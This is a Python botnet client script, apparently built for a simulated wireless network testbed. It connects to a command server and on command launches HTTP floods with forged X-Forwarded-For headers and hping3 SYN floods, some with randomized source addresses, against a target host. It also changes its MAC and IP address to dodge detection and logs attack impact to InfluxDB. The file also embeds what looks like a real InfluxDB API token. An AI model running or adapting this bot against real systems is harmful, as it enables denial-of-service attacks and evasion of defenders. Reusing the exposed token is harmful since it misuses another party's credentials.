import os
import time
import subprocess
import threading
import random
import math
import requests
import csv
import socket
from influxdb_client_3 import (InfluxDBClient3, Point) 


#======== set parameter =====================
ip = "10.0.0.12"  # IP of botnet
mac = "00:00:00:00:00:02"  # MAC of botnets
Interface = "attacker2-wlan0"  # interface of botnet
url = 'http://10.0.0.4/'  # URL of target
target_ip = "10.0.0.4"  # IP of target

HOST = "10.0.0.11"  # IP of the attacker server
PORT = 700  # port for communication

INFLUXDB_TOKEN = 'rHXqbMiPtknz6xNxw_RRe3CqmWtlMM_NQCv1OzdE83M41q17gSgVg_Fuewbg4RjyGhbQVe4wVh8ms_WijUCJxQ=='
host = "https://us-east-1-1.aws.cloud2.influxdata.com"
database = "attacker"
org = "Dev"
client = InfluxDBClient3(host=host, token=INFLUXDB_TOKEN, org=org)

#========= InfluxDB ==============================
def upload_to_influxdb(timestamp, avg_delay, min_delay, max_delay, packet_loss):
    """Upload latency statistics to InfluxDB."""
    point = Point("latency_stats").tag("node", "attacker2").field("timestamp", timestamp).field("Loss", packet_loss).field("AvgDelay", avg_delay).field("MinDelay", min_delay).field("MaxDelay", max_delay)
    with InfluxDBClient3(host=host, token=INFLUXDB_TOKEN, database=database) as client:
        client.write(point)

#========= CSV ==============================
def save_to_csv(data):
    file_exists = os.path.isfile("result.csv")
    with open("result.csv", mode='a', newline='') as file:
        writer = csv.writer(file)
        if not file_exists:
            writer.writerow(["Timestamp", "Avg Delay (ms)", "Min Delay (ms)", "Max Delay (ms)", "Packet Loss (%)"])
        writer.writerow(data)

#======== Mobility ==========================
def move(node="a1", ap=(30, 30)):
    access_points = [(30, 30), (30, 80)]
    if ap in access_points:
        access_points.remove(ap)
    ap = random.choice(access_points)
    group_radius = 5
    angle = random.uniform(0, 2 * math.pi)
    x = ap[0] + int(group_radius * math.cos(angle))
    y = ap[1] + int(group_radius * math.sin(angle))

    # Using shell=True for the custom 'move' command if it's a shell script/alias
    subprocess.run([f"move {node} {x} {y}"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return f'move to {ap}'

#======== Measure Impact ========================
def attacker_traffic(url='http://10.0.0.4/'):
    total_delay = 0.0
    min_delay = float('inf')
    max_delay = 0.0
    failed_requests = 0

    for i in range(10):
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0'
            ]),
            'X-Forwarded-For': ip,
            'X-Traffic-Label': 'normal'
        }

        start_time = time.time()
        try:
            response = requests.get(url, headers=headers, timeout=5)
            delay = (time.time() - start_time) * 1000  # ms
            total_delay += delay
            min_delay = min(min_delay, delay)
            max_delay = max(max_delay, delay)
            print(f"Packet #{i+1} | Status: {response.status_code} | Delay: {delay:.2f} ms")
        except requests.exceptions.RequestException as e:
            failed_requests += 1
            print(f"Packet #{i+1} Failed: {e}")

        time.sleep(random.uniform(0.1, 3))

    avg_delay = total_delay / (10 - failed_requests) if (10 - failed_requests) > 0 else 0.0
    packet_loss = (failed_requests / 10) * 100

    upload_to_influxdb(time.time(), avg_delay, min_delay, max_delay, packet_loss)
    
    result = f"Summary from attacker: Avg Delay: {avg_delay:.2f} ms | Loss: {packet_loss:.2f}%"
    try:
        s.sendall(result.encode())
    except:
        pass

#=========== change mac addr ============
def change_mac(old_ip, old_mac):
    range_mac = list(range(20, 255))
    try:
        range_mac.remove(int(old_mac.split(':')[-1], 16))
    except ValueError:
        pass
    
    range_ip = list(range(30, 255))
    try:
        range_ip.remove(int(old_ip.split('.')[-1]))
    except ValueError:
        pass

    new_mac = "00:00:00:00:00:{:02x}".format(random.choice(range_mac))
    new_ip = "10.0.0.{:d}".format(random.choice(range_ip))
    
    # Combined command for shell execution
    cmd = f"iw dev {Interface} disconnect && ifconfig {Interface} down && ifconfig {Interface} hw ether {new_mac} && ifconfig {Interface} {new_ip} && ifconfig {Interface} up && iw dev {Interface} connect ssid1"
    subprocess.run(cmd, shell=True)
    return new_ip, new_mac

#============= Attack ===================
def http_re(url='http://10.0.0.4/', pps=100):
    pps = int(pps)
    for i in range(pps):
        headers = {
            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}",
            'X-Traffic-Label': 'normal'
        }
        try:
            response = requests.get(url, headers=headers, timeout=5)
            print(f"[{headers['X-Forwarded-For']}] {response.status_code}")
        except:
            pass
        time.sleep(1/pps)
    return "Finished Attack HTTP"

def tcp_attack(pps=1):
    rate = 1000000/int(pps)
    cmd = ["timeout", "10", "hping3", "-S", target_ip, "-p", "80", "-i", f"u{rate}", "-w", "0"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in iter(process.stdout.readline, b''):
        print(line.decode().strip())
    return "Finished Attack TCP"

def spoof_attack(pps=1):
    rate = 1000000/int(pps)
    cmd = ["timeout", "10", "hping3", "-S", target_ip, "--rand-source", "-p", "80", "-i", f"u{rate}", "-w", "0"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in iter(process.stdout.readline, b''):
        print(line.decode().strip())
    return "Finished Attack TCP_Spoof"

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        print("Connected to server")
        s.sendall(b'Hello server')
        
        while True:
            command = s.recv(1024).decode()
            if not command:
                break
            print(f"Received: {command}")

            if command == "move":
                move("a2")
            
            elif command == "change_mac":
                ip, mac = change_mac(ip, mac)
                result = f"Changed MAC to {mac} and IP to {ip}"
                s.sendall(result.encode())

            elif command == "attacker_traffic":
                attacker_traffic()

            elif 'http_re' in command:
                parts = command.split()
                val = parts[1] if len(parts) > 1 else 100
                threading.Thread(target=http_re, args=(url, val)).start()
                threading.Thread(target=attacker_traffic).start()

            elif 'tcp_attack' in command:
                parts = command.split()
                val = parts[1] if len(parts) > 1 else 1
                threading.Thread(target=tcp_attack, args=(val,)).start()
                threading.Thread(target=attacker_traffic).start()

            elif 'spoof_attack' in command:
                parts = command.split()
                val = parts[1] if len(parts) > 1 else 1
                threading.Thread(target=spoof_attack, args=(val,)).start()
                threading.Thread(target=attacker_traffic).start()

            elif command == "exit":
                break
    except Exception as e:
        print(f"Connection error: {e}")
    finally:
        s.close()

